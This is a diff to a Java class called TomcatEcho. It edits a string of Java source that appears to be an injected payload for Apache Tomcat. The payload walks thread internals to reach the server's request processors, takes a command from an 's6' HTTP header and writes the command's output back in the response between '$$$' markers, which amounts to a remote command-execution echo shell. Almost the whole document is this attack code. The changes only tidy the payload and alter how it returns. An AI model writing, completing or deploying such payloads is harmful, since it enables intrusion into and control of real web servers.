@@ -48,15 +48,12 @@ public class TomcatEcho {
                 "                        Object target = getField(thread,\"target\");\n" +
                 "                        Object global = null;\n" +
                 "                        if (target instanceof Runnable){\n" +
-                "                            // 需要遍历其中的 this$0/handler/global\n" +
-                "                            // 需要进行异常捕获，因为存在找不到的情况\n" +
                 "                            try {\n" +
                 "                                global = getField(getField(getField(target,\"this$0\"),\"handler\"),\"global\");\n" +
                 "                            } catch (NoSuchFieldException fieldException){\n" +
                 "                                fieldException.printStackTrace();\n" +
                 "                            }\n" +
                 "                        }\n" +
-                "                        // 如果成功找到了 我们的 global ，我们就从里面获取我们的 processors\n" +
                 "                        if (global != null){\n" +
                 "                            java.util.List processors = (java.util.List) getField(global,\"processors\");\n" +
                 "                            for (i=0;i<processors.size();i++){\n" +
@@ -65,8 +62,8 @@ public class TomcatEcho {
                 "                                    org.apache.coyote.Request tempRequest = (org.apache.coyote.Request) getField(requestInfo,\"req\");\n" +
                 "                                    org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) tempRequest.getNote(1);\n" +
                 "                                    org.apache.catalina.connector.Response response = request.getResponse();\n" +
+              //  "System.out.println(request);"+
                 "                                    String cmd = null;\n" +
-                "                                    // 从 header 中获取\n" +
                 "                                    if (request.getHeader(\"s6\") != null){\n" +
                 "                                        cmd = request.getHeader(\"s6\");\n" +
                 "                                    }\n" +
@@ -77,10 +74,13 @@ public class TomcatEcho {
                 "                                        java.io.Writer writer = response.getWriter();\n" +
                 "                                        writer.write(\"$$$\\n\");\n" +
                 "                                        writer.write(new String(result));\n" +
+             //     "System.out.println(new String(result));"+
+             //     "System.out.println(writer);"+
                 "                                        writer.write(\"$$$\\n\");\n" +
                 "                                        writer.flush();\n" +
+                "                                        writer.close(); \n   "+
                 "                                        flag = true;\n" +
-                "                                        break;\n" +
+                "                                        return;\n" +
                 "                                    }\n" +
                 "                                    if (flag){\n" +
                 "                                        break;\n" +
